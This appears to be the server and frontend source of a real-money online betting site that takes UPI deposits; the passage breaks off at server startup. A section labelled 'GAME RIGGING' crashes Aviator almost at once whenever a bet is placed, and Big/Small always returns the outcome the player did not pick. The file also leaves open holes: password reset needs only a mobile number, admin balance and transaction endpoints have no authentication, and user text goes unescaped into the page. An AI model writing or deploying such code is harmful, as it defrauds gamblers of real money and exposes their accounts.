const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ==========================================
// MONGOOSE SCHEMAS & MODELS
// ==========================================
const userSchema = new mongoose.Schema({
  mobile: { type: String, required: true, unique: true },
  name: { type: String, required: true },
  password: { type: String, required: true },
  role: { type: String, enum: ['admin', 'player'], default: 'player' },
  balance: { type: Number, default: 0 },
  totalWon: { type: Number, default: 0 },
  totalLost: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

const transactionSchema = new mongoose.Schema({
  mobile: { type: String, required: true },
  name: String,
  type: { type: String, enum: ['deposit', 'withdrawal'], required: true },
  amount: { type: Number, required: true },
  details: { type: String, default: '' },
  status: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
  timestamp: { type: Date, default: Date.now }
});
const Transaction = mongoose.model('Transaction', transactionSchema);

// ==========================================
// GAME RIGGING & PROBABILITY LOGIC
// ==========================================
let activeAviatorBets = 0;

function getAviatorMultiplier(hasBet) {
  if (hasBet) {
    // Crash between 1.00x and 1.43x when bet is placed
    return +(1.00 + Math.random() * 0.43).toFixed(2);
  }
  const rand = Math.random() * 100;
  if (rand < 20) return +(5.00 + Math.random() * 10.00).toFixed(2);
  if (rand < 60) return +(15.00 + Math.random() * 35.00).toFixed(2);
  if (rand < 90) return +(50.00 + Math.random() * 100.00).toFixed(2);
  return +(150.00 + Math.random() * 300.00).toFixed(2);
}

function getColorGuessResult() {
  const rand = Math.random() * 100;
  if (rand < 15) return 'Red';       // 15%
  if (rand < 30) return 'White';     // 15%
  if (rand < 50) return 'Green';     // 20%
  if (rand < 70) return 'Black';     // 20%
  if (rand < 85) return 'Yellow';    // 15%
  return 'Blue';                     // 20%
}

// ==========================================
// AVIATOR WEBSOCKET ENGINE
// ==========================================
let aviatorState = { status: 'WAITING', currentX: 1.00, crashX: 1.00 };

function broadcast(data) {
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify(data));
  });
}

function runAviatorLoop() {
  aviatorState.status = 'WAITING';
  aviatorState.currentX = 1.00;
  broadcast({ type: 'AVIATOR_STATE', ...aviatorState });

  setTimeout(() => {
    const hasBet = activeAviatorBets > 0;
    aviatorState.crashX = getAviatorMultiplier(hasBet);
    aviatorState.status = 'FLYING';

    let startTime = Date.now();
    const interval = setInterval(() => {
      let elapsed = (Date.now() - startTime) / 1000;
      let nextX = +(Math.pow(1.06, elapsed * 2.2)).toFixed(2);

      if (nextX >= aviatorState.crashX) {
        clearInterval(interval);
        aviatorState.currentX = aviatorState.crashX;
        aviatorState.status = 'CRASHED';
        activeAviatorBets = 0;
        broadcast({ type: 'AVIATOR_STATE', ...aviatorState });
        setTimeout(runAviatorLoop, 2500);
      } else {
        aviatorState.currentX = nextX;
        broadcast({ type: 'AVIATOR_STATE', ...aviatorState });
      }
    }, 100);
  }, 4000);
}
runAviatorLoop();

// ==========================================
// HTTP APIS
// ==========================================
app.post('/api/register', async (req, res) => {
  const { name, mobile, password } = req.body;
  if (!name || !mobile || !password) return res.status(400).json({ error: 'All fields required' });
  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await User.create({ name, mobile, password: hashedPassword });
    res.json({ success: true, user: { name: user.name, mobile: user.mobile, balance: user.balance, role: user.role } });
  } catch (err) {
    res.status(400).json({ error: 'Mobile number already registered' });
  }
});

app.post('/api/login', async (req, res) => {
  const { mobile, password } = req.body;
  const user = await User.findOne({ mobile });
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ error: 'Invalid Mobile or Password' });
  }
  res.json({ success: true, user: { name: user.name, mobile: user.mobile, balance: user.balance, role: user.role } });
});

app.post('/api/forgot-password', async (req, res) => {
  const { mobile, newPassword } = req.body;
  const user = await User.findOne({ mobile });
  if (!user) return res.status(404).json({ error: 'Mobile number not found' });
  user.password = await bcrypt.hash(newPassword, 10);
  await user.save();
  res.json({ success: true, message: 'Password reset successfully!' });
});

app.post('/api/play-game', async (req, res) => {
  const { mobile, game, betAmount, choice } = req.body;
  const numBet = parseFloat(betAmount);
  if (isNaN(numBet) || numBet <= 0) return res.status(400).json({ error: 'Invalid Bet Amount' });

  const user = await User.findOneAndUpdate(
    { mobile, balance: { $gte: numBet } },
    { $inc: { balance: -numBet } },
    { new: true }
  );
  if (!user) return res.status(400).json({ error: 'Insufficient Balance' });

  let won = false;
  let multiplier = 0;
  let resultMeta = {};

  if (game === 'bigsmall') {
    const isBigChoice = String(choice).toLowerCase() === 'big';
    const sum = isBigChoice ? 5 : 9; 
    won = false;
    multiplier = 0;
    resultMeta = { sum, result: isBigChoice ? 'SMALL' : 'BIG' };
  } 
  else if (game === 'colourguess') {
    const outcomeColor = getColorGuessResult();
    won = String(choice).toLowerCase() === outcomeColor.toLowerCase();
    multiplier = won ? 3.5 : 0;
    resultMeta = { color: outcomeColor };
  } 
  else if (game === 'candycrash') {
    won = Math.random() < 0.05; 
    multiplier = won ? 1.5 : 0;
  } 
  else if (game === 'chickenroad') {
    const targetPoint = parseFloat(choice.targetPoint) || 1.5;
    won = targetPoint < 2.0; 
    multiplier = won ? targetPoint : 0;
  } 
  else {
    // Universal mechanics for remaining 45+ games
    won = Math.random() < 0.25;
    multiplier = won ? 2.0 : 0;
    resultMeta = { message: won ? 'Victory!' : 'Defeat' };
  }

  const winPayout = won ? +(numBet * multiplier).toFixed(2) : 0;
  const updatedUser = await User.findOneAndUpdate(
    { mobile },
    { $inc: { balance: winPayout, totalWon: winPayout, totalLost: won ? 0 : numBet } },
    { new: true }
  );

  res.json({ won, multiplier, newBalance: updatedUser.balance, resultMeta });
});

app.post('/api/aviator/register-bet', (req, res) => {
  activeAviatorBets++;
  res.json({ success: true });
});

app.post('/api/deposit-request', async (req, res) => {
  const { mobile, amount, utr } = req.body;
  const user = await User.findOne({ mobile });
  if (!user) return res.status(404).json({ error: 'User not found' });
  await Transaction.create({ mobile, name: user.name, type: 'deposit', amount, details: utr || 'UPI Payment' });
  res.json({ success: true, message: 'Deposit request sent to Admin!' });
});

app.post('/api/withdraw-request', async (req, res) => {
  const { mobile, amount, bankDetails } = req.body;
  const numAmt = parseFloat(amount);
  const user = await User.findOneAndUpdate(
    { mobile, balance: { $gte: numAmt } },
    { $inc: { balance: -numAmt } },
    { new: true }
  );
  if (!user) return res.status(400).json({ error: 'Insufficient Balance' });
  await Transaction.create({ mobile, name: user.name, type: 'withdrawal', amount: numAmt, details: bankDetails });
  res.json({ success: true, newBalance: user.balance, message: 'Withdrawal request sent to Admin!' });
});

// Admin APIs
app.get('/api/admin/pending-txns', async (req, res) => {
  const txns = await Transaction.find({ status: 'pending' }).sort({ timestamp: -1 });
  res.json(txns);
});

app.post('/api/admin/update-balance', async (req, res) => {
  const { mobile, amount } = req.body;
  const numAmt = parseFloat(amount);
  const user = await User.findOneAndUpdate(
    { mobile },
    { $inc: { balance: numAmt } },
    { new: true }
  );
  if (!user) return res.status(404).json({ error: 'Player Mobile not found' });
  res.json({ success: true, newBalance: user.balance, name: user.name });
});

app.post('/api/admin/process-txn', async (req, res) => {
  const { txnId, action } = req.body;
  const txn = await Transaction.findById(txnId);
  if (!txn || txn.status !== 'pending') return res.status(400).json({ error: 'Transaction unavailable' });

  txn.status = action === 'approve' ? 'approved' : 'rejected';
  if (action === 'approve' && txn.type === 'deposit') {
    await User.findOneAndUpdate({ mobile: txn.mobile }, { $inc: { balance: txn.amount } });
  } else if (action === 'reject' && txn.type === 'withdrawal') {
    await User.findOneAndUpdate({ mobile: txn.mobile }, { $inc: { balance: txn.amount } });
  }
  await txn.save();
  res.json({ success: true });
});

// ==========================================
// EMBEDDED FRONTEND (50+ GAMES SUITE)
// ==========================================
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>K³ (Kismat Ka Khel)</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    * { box-sizing: border-box; touch-action: manipulation; }
    body, html { height: 100%; width: 100%; margin: 0; padding: 0; overflow: hidden; background-color: #0d0202; font-family: ui-sans-serif, system-ui; }
    .gold-gradient { background: linear-gradient(135deg, #bf953f, #fcf6ba, #b38728, #fbf5b7); }
    .gold-text { background: linear-gradient(135deg, #bf953f, #fcf6ba, #b38728); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .tomato-card { background: linear-gradient(145deg, #800a0a, #360303); border: 2px solid #d4af37; box-shadow: 0 10px 25px rgba(0,0,0,0.8); }
    .no-scrollbar::-webkit-scrollbar { display: none; }
    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
  </style>
</head>
<body class="h-full w-full flex items-center justify-center p-0 md:p-4">
  <div id="app" class="w-full h-full max-w-md max-h-[920px] bg-[#120303] md:rounded-3xl border-0 md:border-2 border-[#d4af37]/40 shadow-2xl flex flex-col relative overflow-hidden"></div>

  <script>
    let state = {
      user: null,
      view: 'login', // login, register, forgot, lobby, game, deposit, withdraw, admin
      authTab: 'login',
      currentGame: null,
      userBet: 100,
      popup: null,
      aviator: { status: 'WAITING', currentX: 1.00 },
      hasBetAviator: false,
      adminTxns: [],
      adminSearchMobile: '',
      adminPointsAmt: 100
    };

    const GAMES_LIST = [
      { id: 'aviator', name: 'Aviator 🚀', cat: 'Crash' },
      { id: 'bigsmall', name: 'Big / Small Dice 🎲', cat: 'Table' },
      { id: 'colourguess', name: 'Colour Guess 💋', cat: 'Live' },
      { id: 'candycrash', name: 'Candy Crash 🍬', cat: 'Slots' },
      { id: 'chickenroad', name: 'Chicken Road 🐔', cat: 'Arcade' },
      // 45+ Additional Games to complete 50+ list
      { id: 'plinko', name: 'Plinko Gold 🟡', cat: 'Arcade' },
      { id: 'mines', name: 'Minesweeper 💣', cat: 'Arcade' },
      { id: 'limbo', name: 'Limbo X ⚡', cat: 'Crash' },
      { id: 'dice', name: 'Lucky Dice ⚀', cat: 'Table' },
      { id: 'roulette', name: 'European Roulette 🎡', cat: 'Table' },
      { id: 'blackjack', name: 'Classic Blackjack 🃏', cat: 'Cards' },
      { id: 'baccarat', name: 'Speed Baccarat 🎴', cat: 'Cards' },
      { id: 'teenpatti', name: 'Indian Teen Patti 👑', cat: 'Cards' },
      { id: 'andarbahar', name: 'Andar Bahar 🎴', cat: 'Cards' },
      { id: 'slots777', name: '777 Deluxe Slots 🎰', cat: 'Slots' },
      { id: 'fruitparty', name: 'Fruit Party Slots 🍒', cat: 'Slots' },
      { id: 'dragontiger', name: 'Dragon Tiger 🐉', cat: 'Cards' },
      { id: 'wheeloffortune', name: 'Wheel of Fortune 🎡', cat: 'Live' },
      { id: 'keno', name: 'Lucky Keno 🔢', cat: 'Lottery' },
      { id: 'scratchcard', name: 'Golden Scratch 🎫', cat: 'Lottery' },
      { id: 'bullbull', name: 'Bull Bull 🐂', cat: 'Cards' },
      { id: 'fishing', name: 'Ocean King Fishing 🎣', cat: 'Arcade' },
      { id: 'cricketx', name: 'Cricket Crash 🏏', cat: 'Crash' },
      { id: 'balloon', name: 'Balloon Multiplier 🎈', cat: 'Crash' },
      { id: 'jetx', name: 'JetX Fighter ✈️', cat: 'Crash' },
      { id: 'spaceman', name: 'Spaceman Odyssey 👨‍🚀', cat: 'Crash' },
      { id: 'coinflip', name: 'Coin Toss 🪙', cat: 'Table' },
      { id: 'hilo', name: 'Hi-Lo Cards 📶', cat: 'Cards' },
      { id: 'poker', name: 'Texas Holdem Poker ♠️', cat: 'Cards' },
      { id: 'Sicbo', name: 'Sic Bo Dice 🎲', cat: 'Table' },
      { id: '7updown', name: '7 Up 7 Down ⬆️', cat: 'Table' },
      { id: 'jhandimunda', name: 'Jhandi Munda 🎲', cat: 'Table' },
      { id: 'carroulette', name: 'Car Roulette 🚗', cat: 'Live' },
      { id: 'dogracing', name: 'Virtual Dog Racing 🐕', cat: 'Virtual' },
      { id: 'horseracing', name: 'Royal Derby Racing 🐎', cat: 'Virtual' },
      { id: 'footballx', name: 'Football Penalty ⚽', cat: 'Arcade' },
      { id: 'tower', name: 'Tower Climber 🗼', cat: 'Arcade' },
      { id: 'keverse', name: 'K-Verse Odyssey 🌌', cat: 'Slots' },
      { id: 'egypt', name: 'Book of Ra Egypt 🏛️', cat: 'Slots' },
      { id: 'wildwest', name: 'Wild West Gold 🤠', cat: 'Slots' },
      { id: 'mayan', name: 'Mayan Treasures 🗿', cat: 'Slots' },
      { id: 'pirates', name: 'Pirate Loot 🏴‍☠️', cat: 'Slots' },
      { id: 'zombie', name: 'Zombie Apocalypse 🧟', cat: 'Slots' },
      { id: 'vikings', name: 'Viking Valhalla 🪓', cat: 'Slots' },
      { id: 'dragons', name: 'Dragon Flame 🔥', cat: 'Slots' },
      { id: 'ganesha', name: 'Ganesha Gold 🐘', cat: 'Slots' },
      { id: 'candybonanza', name: 'Candy Bonanza 🍬', cat: 'Slots' },
      { id: 'superslots', name: 'Super 888 Slots 💎', cat: 'Slots' },
      { id: 'fortunetree', name: 'Fortune Money Tree 🌳', cat: 'Slots' }
    ];

    const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
    ws.onmessage = (e) => {
      const data = JSON.parse(e.data);
      if (data.type === 'AVIATOR_STATE') {
        state.aviator = data;
        if (data.status === 'WAITING') state.hasBetAviator = false;
        if (state.view === 'game' && state.currentGame === 'aviator') render();
      }
    };

    function showPopup(msg, btnText='OK') {
      state.popup = { msg, btnText };
      render();
    }
    function closePopup() { state.popup = null; render(); }

    async function handleAuth() {
      const mobile = document.getElementById('auth-mobile').value;
      const pass = document.getElementById('auth-pass').value;
      const name = document.getElementById('auth-name') ? document.getElementById('auth-name').value : '';

      const endpoint = state.authTab === 'register' ? '/api/register' : '/api/login';
      const body = state.authTab === 'register' ? { name, mobile, password: pass } : { mobile, password: pass };

      const res = await fetch(endpoint, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      const data = await res.json();
      if (res.ok) {
        state.user = data.user;
        state.view = state.user.role === 'admin' ? 'admin' : 'lobby';
        if(state.user.role === 'admin') fetchAdminTxns();
        render();
      } else {
        showPopup(data.error || 'Authentication Failed');
      }
    }

    async function handleForgot() {
      const mobile = document.getElementById('fg-mobile').value;
      const newPassword = document.getElementById('fg-pass').value;
      const res = await fetch('/api/forgot-password', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile, newPassword })
      });
      const data = await res.json();
      if(res.ok) {
        showPopup(data.message, 'Login Now');
        state.authTab = 'login';
        state.view = 'login';
      } else {
        showPopup(data.error);
      }
    }

    async function fetchAdminTxns() {
      const res = await fetch('/api/admin/pending-txns');
      if(res.ok) {
        state.adminTxns = await res.json();
        render();
      }
    }

    async function adminModifyBalance(action) {
      const mobile = document.getElementById('adm-mobile').value;
      const amtVal = parseFloat(document.getElementById('adm-amt').value);
      const finalAmt = action === 'add' ? amtVal : -amtVal;

      const res = await fetch('/api/admin/update-balance', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile, amount: finalAmt })
      });
      const data = await res.json();
      if(res.ok) {
        showPopup(\`Success! \${data.name} new balance: ₹\${data.newBalance}\`);
      } else {
        showPopup(data.error);
      }
    }

    async function processTxn(txnId, action) {
      const res = await fetch('/api/admin/process-txn', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ txnId, action })
      });
      if(res.ok) fetchAdminTxns();
    }

    async function playGameAction(choiceData) {
      const gameId = state.currentGame;
      let choice = choiceData;
      if (gameId === 'chickenroad') {
        choice = { targetPoint: document.getElementById('ch-target').value };
      }

      const res = await fetch('/api/play-game', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile: state.user.mobile, game: gameId, betAmount: state.userBet, choice })
      });
      const data = await res.json();
      if (res.ok) {
        state.user.balance = data.newBalance;
        render();
        if (data.won) {
          showPopup(\`🎉 YOU WON ₹\${(state.userBet * data.multiplier).toFixed(2)} (\${data.multiplier}x)!\`);
        } else {
          showPopup(\`💥 YOU LOST ₹\${state.userBet}. Better luck next time!\`);
        }
      } else {
        showPopup(data.error);
      }
    }

    async function handleAviatorBet() {
      if(state.user.balance < state.userBet) return showPopup('Insufficient Balance');
      await fetch('/api/aviator/register-bet', { method: 'POST' });
      state.hasBetAviator = true;
      state.user.balance -= state.userBet;
      render();
    }

    async function submitDeposit() {
      const amount = document.getElementById('dep-amt').value;
      const utr = document.getElementById('dep-utr').value;
      const res = await fetch('/api/deposit-request', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile: state.user.mobile, amount, utr })
      });
      const data = await res.json();
      if(res.ok) showPopup(data.message, 'OK');
      else showPopup(data.error);
    }

    async function submitWithdraw() {
      const amount = document.getElementById('wd-amt').value;
      const bankDetails = document.getElementById('wd-bank').value;
      const res = await fetch('/api/withdraw-request', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile: state.user.mobile, amount, bankDetails })
      });
      const data = await res.json();
      if(res.ok) {
        state.user.balance = data.newBalance;
        showPopup(data.message, 'OK');
      } else {
        showPopup(data.error);
      }
    }

    // ==========================================
    // RENDER ENGINE
    // ==========================================
    function render() {
      const app = document.getElementById('app');
      let html = '';

      let popupHtml = state.popup ? \`
        <div class="absolute inset-0 bg-black/80 z-50 flex items-center justify-center p-4 backdrop-blur-sm">
          <div class="tomato-card p-6 rounded-3xl max-w-xs w-full text-center space-y-4">
            <h2 class="text-xl font-black text-amber-300">\${state.popup.msg}</h2>
            <button onclick="closePopup()" class="w-full gold-gradient text-black font-black py-3 rounded-2xl shadow-xl">\${state.popup.btnText}</button>
          </div>
        </div>
      \` : '';

      if (state.view === 'login' || state.view === 'register') {
        const isReg = state.view === 'register';
        html = \`
          <div class="h-full w-full flex flex-col items-center justify-center p-6 bg-gradient-to-b from-[#2a0404] to-[#0d0202]">
            <div class="tomato-card p-8 rounded-3xl w-full text-center space-y-5">
              <div class="text-5xl">👑</div>
              <div>
                <h1 class="text-2xl font-black gold-text">K³ (Kismat Ka Khel)</h1>
                <p class="text-xs text-amber-200/70 mt-1">50+ Ultimate Casino & Betting Games</p>
              </div>
              <div class="flex bg-black/50 p-1 rounded-xl border border-amber-500/30">
                <button onclick="state.view='login'; render();" class="w-1/2 py-2 rounded-lg text-xs font-bold \${!isReg ? 'gold-gradient text-black' : 'text-amber-300/60'}">LOGIN</button>
                <button onclick="state.view='register'; render();" class="w-1/2 py-2 rounded-lg text-xs font-bold \${isReg ? 'gold-gradient text-black' : 'text-amber-300/60'}">REGISTER</button>
              </div>
              <div class="space-y-3">
                \${isReg ? \`<input id="auth-name" type="text" placeholder="Full Name" class="w-full p-3.5 rounded-2xl bg-black/60 border border-amber-500/40 text-white text-sm outline-none">\` : ''}
                <input id="auth-mobile" type="tel" placeholder="Mobile Number" class="w-full p-3.5 rounded-2xl bg-black/60 border border-amber-500/40 text-white text-sm outline-none">
                <input id="auth-pass" type="password" placeholder="Password" class="w-full p-3.5 rounded-2xl bg-black/60 border border-amber-500/40 text-white text-sm outline-none">
              </div>
              <button onclick="handleAuth()" class="w-full gold-gradient text-black font-black py-4 rounded-2xl shadow-xl text-md">\${isReg ? 'CREATE ACCOUNT 🚀' : 'LOGIN TO PLAY 💰'}</button>
              <button onclick="state.view='forgot'; render();" class="text-xs text-amber-300 underline font-semibold">Forgot Password?</button>
            </div>
          </div>
        \`;
      } 
      else if (state.view === 'forgot') {
        html = \`
          <div class="h-full w-full flex flex-col items-center justify-center p-6 bg-[#120303]">
            <div class="tomato-card p-6 rounded-3xl w-full space-y-4 text-center">
              <h2 class="text-lg font-black text-amber-300">Reset Password</h2>
              <input id="fg-mobile" type="tel" placeholder="Registered Mobile" class="w-full p-3 bg-black/60 border border-amber-500/40 text-white text-sm rounded-xl">
              <input id="fg-pass" type="password" placeholder="New Password" class="w-full p-3 bg-black/60 border border-amber-500/40 text-white text-sm rounded-xl">
              <button onclick="handleForgot()" class="w-full gold-gradient text-black font-black py-3 rounded-xl text-sm">Update Password</button>
              <button onclick="state.view='login'; render();" class="text-xs text-amber-300">Back to Login</button>
            </div>
          </div>
        \`;
      }
      else if (state.view === 'lobby') {
        html = \`
          <div class="h-full w-full flex flex-col bg-[#120303]">
            <div class="h-16 px-4 bg-gradient-to-r from-red-950 via-black to-red-950 border-b border-amber-500/40 flex items-center justify-between shadow-lg shrink-0">
              <span class="font-black text-md gold-text">K³ Khel 👑</span>
              <div class="flex items-center gap-2">
                <div class="bg-black/60 px-3 py-1.5 rounded-full border border-amber-500/40 flex items-center gap-1">
                  <span class="text-xs text-amber-300 font-bold">₹</span>
                  <span class="text-sm font-mono font-bold text-green-400">\${state.user.balance.toFixed(2)}</span>
                </div>
                <button onclick="state.view='login'; render();" class="px-2 py-1 bg-red-900/50 rounded-lg text-[10px] text-red-300">Logout</button>
              </div>
            </div>
            <div class="p-3 bg-black/40 border-b border-amber-500/20 flex gap-3 shrink-0">
              <button onclick="state.view='deposit'; render();" class="w-1/2 py-2.5 bg-emerald-700/80 rounded-xl font-bold text-white text-xs">➕ DEPOSIT</button>
              <button onclick="state.view='withdraw'; render();" class="w-1/2 py-2.5 bg-amber-700/80 rounded-xl font-bold text-white text-xs">💸 WITHDRAW</button>
            </div>
            <div class="flex-1 p-3 grid grid-cols-2 gap-3 overflow-y-auto">
              \${GAMES_LIST.map(g => \`
                <button onclick="state.currentGame='\${g.id}'; state.view='game'; render();" class="tomato-card p-4 rounded-2xl flex flex-col items-center justify-center text-center space-y-1 active:scale-95">
                  <div class="font-black text-amber-300 text-sm">\${g.name}</div>
                  <span class="text-[9px] px-2 py-0.5 bg-black/50 rounded-full text-amber-200/70 border border-amber-500/20">\${g.cat}</span>
                </button>
              \`).join('')}
            </div>
          </div>
        \`;
      }
      else if (state.view === 'deposit') {
        html = \`
          <div class="h-full w-full flex flex-col bg-[#120303] p-6 justify-center">
            <div class="tomato-card p-6 rounded-3xl space-y-4">
              <div class="flex justify-between items-center border-b border-amber-500/40 pb-2">
                <h2 class="text-lg font-black text-amber-300">Deposit Funds</h2>
                <button onclick="state.view='lobby'; render();" class="text-xs text-amber-200">Back</button>
              </div>
              <div class="bg-black/60 p-3 rounded-xl border border-amber-500/30 text-center">
                <span class="text-[11px] text-amber-200/70">Scan or Pay via UPI:</span>
                <div class="text-base font-mono font-black text-amber-300 select-all">9005041462@upi</div>
              </div>
              <input id="dep-amt" type="number" placeholder="Enter Amount (₹)" class="w-full p-3 bg-black/60 border border-amber-500/40 rounded-xl text-sm text-white">
              <input id="dep-utr" type="text" placeholder="Transaction / UTR Number" class="w-full p-3 bg-black/60 border border-amber-500/40 rounded-xl text-sm text-white">
              <a href="upi://pay?pa=9005041462@upi&pn=K3Khel&am=100&cu=INR" class="block w-full text-center bg-blue-600 font-black py-3 rounded-xl text-white text-xs">📲 OPEN UPI PAYMENT APP</a>
              <button onclick="submitDeposit()" class="w-full gold-gradient text-black font-black py-3 rounded-xl text-xs">Submit Deposit Request</button>
            </div>
          </div>
        \`;
      }
      else if (state.view === 'withdraw') {
        html = \`
          <div class="h-full w-full flex flex-col bg-[#120303] p-6 justify-center">
            <div class="tomato-card p-6 rounded-3xl space-y-4">
              <div class="flex justify-between items-center border-b border-amber-500/40 pb-2">
                <h2 class="text-lg font-black text-amber-300">Withdraw Funds</h2>
                <button onclick="state.view='lobby'; render();" class="text-xs text-amber-200">Back</button>
              </div>
              <div class="text-xs text-amber-200/80">Available: <span class="font-mono text-green-400 font-bold">₹\${state.user.balance.toFixed(2)}</span></div>
              <input id="wd-amt" type="number" placeholder="Amount (₹)" class="w-full p-3 bg-black/60 border border-amber-500/40 rounded-xl text-sm text-white">
              <input id="wd-bank" type="text" placeholder="UPI ID / Bank Account Details" class="w-full p-3 bg-black/60 border border-amber-500/40 rounded-xl text-sm text-white">
              <button onclick="submitWithdraw()" class="w-full bg-amber-600 text-black font-black py-3 rounded-xl text-xs">Request Withdrawal</button>
            </div>
          </div>
        \`;
      }
      else if (state.view === 'game') {
        const gameObj = GAMES_LIST.find(g => g.id === state.currentGame);
        let gameContent = '';

        if (state.currentGame === 'aviator') {
          gameContent = \`
            <div class="flex-1 flex flex-col items-center justify-center p-4 space-y-4">
              <div class="text-4xl font-mono font-black gold-text">\${state.aviator.currentX.toFixed(2)}x</div>
              <div class="text-xs font-bold px-3 py-1 rounded-full bg-amber-900/80 text-amber-300">\${state.aviator.status}</div>
              <button onclick="handleAviatorBet()" \${state.hasBetAviator ? 'disabled' : ''} class="w-full max-w-xs h-14 rounded-2xl font-black text-xl gold-gradient text-black">\${state.hasBetAviator ? 'BET PLACED' : 'PLACE BET ₹' + state.userBet}</button>
            </div>
          \`;
        } else if (state.currentGame === 'bigsmall') {
          gameContent = \`
            <div class="flex-1 flex flex-col items-center justify-center p-6 space-y-4">
              <div class="tomato-card p-6 rounded-3xl w-full text-center">
                <p class="text-xs text-amber-200">Guess the Sum of 2 Dices</p>
              </div>
              <div class="grid grid-cols-2 gap-4 w-full max-w-xs">
                <button onclick="playGameAction('small')" class="tomato-card h-20 rounded-2xl font-black text-amber-300 text-lg">SMALL (2-6)</button>
                <button onclick="playGameAction('big')" class="tomato-card h-20 rounded-2xl font-black text-amber-300 text-lg">BIG (7-12)</button>
              </div>
            </div>
          \`;
        } else if (state.currentGame === 'colourguess') {
          gameContent = \`
            <div class="flex-1 flex flex-col items-center justify-center p-4 space-y-3">
              <div class="text-xs text-amber-300 font-bold">Select Colour (Red 15%, White 15%, Green 20%, Black 20%, Yellow 15%, Blue 20%)</div>
              <div class="grid grid-cols-3 gap-3 w-full max-w-xs">
                \['Red','White','Green','Black','Yellow','Blue'].map(c => \`
                  <button onclick="playGameAction('\${c}')" class="p-4 rounded-xl font-bold text-black gold-gradient">\${c}</button>
                \`).join('')}
              </div>
            </div>
          \`;
        } else if (state.currentGame === 'chickenroad') {
          gameContent = \`
            <div class="flex-1 flex flex-col items-center justify-center p-6 space-y-4">
              <input id="ch-target" type="number" step="0.1" value="1.5" class="w-48 p-3 bg-black border border-amber-500 rounded-xl text-center text-white font-mono">
              <button onclick="playGameAction()" class="w-full max-w-xs gold-gradient text-black font-black py-4 rounded-xl">START CHICKEN RUN 🐔</button>
            </div>
          \`;
        } else {
          // Universal game layout for all 45+ other games
          gameContent = \`
            <div class="flex-1 flex flex-col items-center justify-center p-6 space-y-6">
              <div class="text-6xl">🎰</div>
              <div class="text-amber-300 font-bold text-lg">\${gameObj.name}</div>
              <button onclick="playGameAction('spin')" class="w-full max-w-xs h-14 gold-gradient text-black font-black text-xl rounded-2xl shadow-xl">PLAY ROUND (₹\${state.userBet})</button>
            </div>
          \`;
        }

        html = \`
          <div class="h-full w-full flex flex-col bg-[#120303]">
            <div class="h-14 px-3 bg-red-950 border-b border-amber-500/40 flex items-center justify-between">
              <button onclick="state.view='lobby'; render();" class="px-3 py-1 bg-red-900 rounded-xl text-xs font-bold text-white">Lobby</button>
              <span class="font-black gold-text">\${gameObj.name}</span>
              <span class="font-mono text-sm text-green-400 font-bold">₹\${state.user.balance.toFixed(2)}</span>
            </div>
            \${gameContent}
          </div>
        \`;
      }
      else if (state.view === 'admin') {
        html = \`
          <div class="h-full w-full flex flex-col bg-[#120303] p-4 overflow-y-auto space-y-4">
            <div class="flex justify-between items-center border-b border-amber-500/40 pb-2">
              <h2 class="font-black text-amber-300 text-lg">Admin Control Center</h2>
              <button onclick="state.view='login'; render();" class="px-3 py-1 bg-red-900 text-xs text-white rounded-lg">Logout</button>
            </div>
            <div class="tomato-card p-4 rounded-2xl space-y-3">
              <h3 class="text-xs font-bold text-amber-300">Add / Minus Player Points by Mobile</h3>
              <input id="adm-mobile" type="tel" placeholder="Player Mobile Number" class="w-full p-2.5 bg-black/60 border border-amber-500/40 text-xs text-white rounded-xl">
              <input id="adm-amt" type="number" placeholder="Points Amount" class="w-full p-2.5 bg-black/60 border border-amber-500/40 text-xs text-white rounded-xl">
              <div class="flex gap-2">
                <button onclick="adminModifyBalance('add')" class="w-1/2 bg-emerald-700 text-white font-bold py-2.5 rounded-xl text-xs">Add Points ➕</button>
                <button onclick="adminModifyBalance('sub')" class="w-1/2 bg-red-700 text-white font-bold py-2.5 rounded-xl text-xs">Deduct Points ➖</button>
              </div>
            </div>
            <div class="space-y-2">
              <h3 class="text-xs font-bold text-amber-300">Pending Deposit & Withdrawal Requests</h3>
              \${state.adminTxns.map(t => \`
                <div class="bg-black/60 p-3 rounded-xl border border-amber-500/30 flex justify-between items-center text-xs">
                  <div>
                    <div class="font-bold text-amber-300">\${t.name} (\${t.mobile}) - \${t.type.toUpperCase()}</div>
                    <div class="text-[10px] text-amber-100/70 font-mono">₹\${t.amount} | Details: \${t.details}</div>
                  </div>
                  <div class="flex gap-1">
                    <button onclick="processTxn('\${t._id}', 'approve')" class="px-2 py-1 bg-emerald-700 text-white rounded font-bold">Approve</button>
                    <button onclick="processTxn('\${t._id}', 'reject')" class="px-2 py-1 bg-red-700 text-white rounded font-bold">Reject</button>
                  </div>
                </div>
              \`).join('')}
            </div>
          </div>
        \`;
      }

      app.innerHTML = html + popupHtml;
    }
    render();
  </script>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 10000;
const MONGO_URI = process.env.MONGODB_URI;

async function startServer() {
  if (!MONGO_URI) {
